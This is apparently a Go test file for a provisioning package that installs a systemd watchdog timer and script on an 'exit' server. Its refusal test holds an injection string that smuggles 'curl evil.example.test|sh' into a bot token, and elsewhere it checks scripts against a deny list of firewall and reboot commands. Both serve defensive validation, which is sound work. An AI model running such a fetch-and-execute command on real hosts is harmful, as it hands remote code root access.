package provision

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/heyearth/backend/internal/config"
)

// watchdogHost is an exit for the watchdog step: files, the scripts it was asked to run, and
// the state of the watcher's units.
type watchdogHost struct {
	files     map[string]string
	modes     map[string]uint32
	scripts   []string
	enabled   bool // the timer is enabled and active
	ran       bool // the first run finished with code 0
	verifyErr error
	startErr  error
}

func newWatchdogHost() *watchdogHost {
	return &watchdogHost{files: map[string]string{}, modes: map[string]uint32{}}
}

func (h *watchdogHost) PutFile(_ context.Context, path string, data []byte, mode uint32) (bool, error) {
	if h.files[path] == string(data) && h.modes[path] == mode {
		return false, nil
	}
	h.files[path], h.modes[path] = string(data), mode
	return true, nil
}

func (h *watchdogHost) Run(_ context.Context, script string) (string, error) {
	h.scripts = append(h.scripts, script)
	switch {
	case strings.Contains(script, "sha256sum"): // remoteStates: the files' hashes and modes
		return fakeStates(h.files, h.modes, script), nil
	case strings.Contains(script, "systemd-analyze verify"):
		return "", h.verifyErr
	case strings.Contains(script, "enable --now"):
		h.enabled = true
		return "", nil
	case strings.Contains(script, "systemctl start "+config.HubWatchServiceUnit):
		if h.startErr != nil {
			return "curl: not found", h.startErr
		}
		h.ran = true
		return "", nil
	case strings.Contains(script, "TIMER=1"): // the check script
		out := ""
		if h.enabled {
			out += "TIMER=1\n"
		}
		if h.ran {
			out += "LAST=1\n"
		}
		return out, nil
	}
	return "", nil
}

func watchdogOpts(record *int) WatchdogOptions {
	return WatchdogOptions{
		Params: config.HubWatchParams{HubAddr: "203.0.113.1", SiteHost: "site.example.test",
			ControlURL: config.HubWatchControlURL, ControlRUURL: config.HubWatchControlRUURL, ExitName: "выход 3", StaggerSec: 30},
		BotToken: "123456:AAfake_watchdog_token", ChatID: "-1001234567890",
		Record: func(context.Context) error { *record++; return nil },
	}
}

func TestWatchdogStepInstalls(t *testing.T) {
	h := newWatchdogHost()
	records := 0
	o := watchdogOpts(&records)
	run := func() HubRun {
		st := NewState(KindWatchdog, Node{}, h, Hooks{})
		return RunHub(context.Background(), KindWatchdog, Recipe{watchdogStep(o)}, st, nil)
	}
	r := run()
	if r.Status != JobSucceeded || stepStatuses(r) != "watchdog=done" || records != 1 {
		t.Fatalf("install: %s %s, records %d", stepStatuses(r), r.Error, records)
	}
	if h.modes[config.HubWatchEnvPath] != 0o600 || !strings.Contains(h.files[config.HubWatchEnvPath], "BOT_TOKEN='123456:AAfake_watchdog_token'") {
		t.Errorf("env: mode %o, %q", h.modes[config.HubWatchEnvPath], h.files[config.HubWatchEnvPath])
	}
	if h.modes[config.HubWatchScriptPath] != 0o755 || !strings.Contains(h.files[config.HubWatchScriptPath], "HUB_ADDR='203.0.113.1'") {
		t.Errorf("script: mode %o", h.modes[config.HubWatchScriptPath])
	}
	for _, p := range []string{config.HubWatchServicePath, config.HubWatchTimerPath} {
		if h.files[p] == "" {
			t.Errorf("%s not written", p)
		}
	}
	if !h.enabled || !h.ran {
		t.Errorf("enabled %v, first run %v", h.enabled, h.ran)
	}
	// the token never reaches a step's output
	for _, s := range r.Steps {
		if strings.Contains(s.Output, "AAfake_watchdog_token") {
			t.Fatalf("the bot token is in the output: %s", s.Output)
		}
	}
	// К0: the job touches neither the tunnels nor the firewall of the exit
	for _, script := range h.scripts {
		for _, bad := range []string{"hysteria", "heyearth-stls", "nft ", "ufw ", "iptables", "systemctl restart", "systemctl stop", "reboot"} {
			if strings.Contains(script, bad) {
				t.Errorf("the watchdog job ran %q:\n%s", bad, script)
			}
		}
	}
	// a second run finds everything in place: nothing is written, the step is «ok»
	if r := run(); stepStatuses(r) != "watchdog=ok" || records != 2 {
		t.Fatalf("second run: %s %s, records %d", stepStatuses(r), r.Error, records)
	}
	// a new Hub address: the script is rewritten
	o.Params.HubAddr = "203.0.113.77"
	if r := run(); r.Status != JobSucceeded || !strings.Contains(h.files[config.HubWatchScriptPath], "HUB_ADDR='203.0.113.77'") {
		t.Fatalf("new address: %s %s", stepStatuses(r), r.Error)
	}
}

func TestWatchdogStepFailsOnBadUnitOrFirstRun(t *testing.T) {
	records := 0
	h := newWatchdogHost()
	h.verifyErr = errors.New("exit status 1")
	st := NewState(KindWatchdog, Node{}, h, Hooks{})
	if r := RunHub(context.Background(), KindWatchdog, Recipe{watchdogStep(watchdogOpts(&records))}, st, nil); r.Status == JobSucceeded || h.enabled {
		t.Fatalf("a unit systemd rejects was enabled: %s", stepStatuses(r))
	}
	h = newWatchdogHost()
	h.startErr = errors.New("exit status 127")
	st = NewState(KindWatchdog, Node{}, h, Hooks{})
	if r := RunHub(context.Background(), KindWatchdog, Recipe{watchdogStep(watchdogOpts(&records))}, st, nil); r.Status == JobSucceeded || records != 0 {
		t.Fatalf("a failing first run: %s, records %d — want a failed job and no record", stepStatuses(r), records)
	}
}

func TestWatchdogRecipeRefusals(t *testing.T) {
	records := 0
	st := NewState(KindWatchdog, Node{}, nil, Hooks{})
	n := Node{ID: 3, Role: "exit", Lifecycle: "online", HostKeyConfirmed: true}
	if _, err := watchdogRecipe(n, st); err == nil {
		t.Error("no options (no watcher bot), yet a job")
	}
	o := watchdogOpts(&records)
	st.Exit.Watchdog = &o
	if rc, err := watchdogRecipe(n, st); err != nil || len(rc) != 1 || rc[0].Name != "watchdog" {
		t.Fatalf("recipe: %v, %v", rc, err)
	}
	for _, bad := range []Node{
		{ID: 5, Role: "relay", Lifecycle: "online", HostKeyConfirmed: true}, // an entry is in RU: it sees what the Hub sees
		{ID: 3, Role: "exit", Lifecycle: "failed", HostKeyConfirmed: true},
		{ID: 3, Role: "exit", Lifecycle: "online"},
	} {
		if _, err := watchdogRecipe(bad, st); err == nil {
			t.Errorf("%+v accepted", bad)
		}
	}
	// a token that is not a token never reaches the env file root sources on the exit
	evil := o
	evil.BotToken = "x'; curl evil.example.test|sh; '"
	st.Exit.Watchdog = &evil
	if _, err := watchdogRecipe(n, st); err == nil {
		t.Error("a token with a quote accepted")
	}
	bad := o
	bad.Params.HubAddr = "hub.example.test"
	st.Exit.Watchdog = &bad
	if _, err := watchdogRecipe(n, st); err == nil {
		t.Error("a Hub address that is not an IP accepted")
	}
	if !ValidKind(KindWatchdog) {
		t.Error("watchdog is not a valid job kind")
	}
	st.Exit.Watchdog = &o
	if rc, err := RecipeFor(KindWatchdog, n, st); err != nil || len(rc) != 1 {
		t.Errorf("RecipeFor: %v, %v", rc, err)
	}
}

// fakeStates answers config.SumsScript for the files the script names.
func fakeStates(files map[string]string, modes map[string]uint32, script string) string {
	var out strings.Builder
	for path, data := range files {
		if strings.Contains(script, "'"+path+"'") {
			out.WriteString(sha256Hex([]byte(data)) + " " + modeString(modes[path]) + "  " + path + "\n")
		}
	}
	return out.String()
}
